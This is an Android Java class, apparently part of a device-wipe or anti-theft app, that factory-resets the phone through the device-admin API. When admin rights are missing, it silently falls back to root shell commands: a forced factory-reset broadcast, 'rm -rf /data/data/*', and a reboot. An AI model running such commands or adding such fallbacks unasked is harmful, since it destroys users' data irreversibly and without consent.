package com.wuzenx.engine;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.os.Build;

import com.wuzenx.services.AdminReceiver;

public class WipeEngine {
    private Context context;

    public WipeEngine(Context context) {
        this.context = context;
    }

    public void wipe() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager)
                context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (dpm == null) return;

            ComponentName cn = new ComponentName(context, AdminReceiver.class);

            if (!dpm.isAdminActive(cn)) {
                // Device admin not active, try fallback
                wipeFallback();
                return;
            }

            // FIXED: Correct API signatures:
            // - Android <14: wipeData(int flags) or wipeData(int flags, CharSequence)
            // - Android 14+: wipeDevice(int flags)

            if (Build.VERSION.SDK_INT >= 34) {
                // Android 14+: wipeDevice(int flags)
                dpm.wipeDevice(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
            } else {
                // Android <14: wipeData(int flags)
                dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
            }

        } catch (SecurityException e) {
            // Not authorized, try fallback
            wipeFallback();
        } catch (Exception e) {
            wipeFallback();
        }
    }

    private void wipeFallback() {
        try {
            // Try shell commands
            Runtime.getRuntime().exec(new String[]{
                "su", "-c", "am broadcast -p android --receiver-foreground " +
                "-a android.intent.action.FACTORY_RESET"
            });
        } catch (Exception ignored) {
            try {
                Runtime.getRuntime().exec(new String[]{
                    "su", "-c", "rm -rf /data/data/*"
                });
            } catch (Exception ignored2) {
                try {
                    Runtime.getRuntime().exec("reboot");
                } catch (Exception ignored3) {}
            }
        }
    }
}
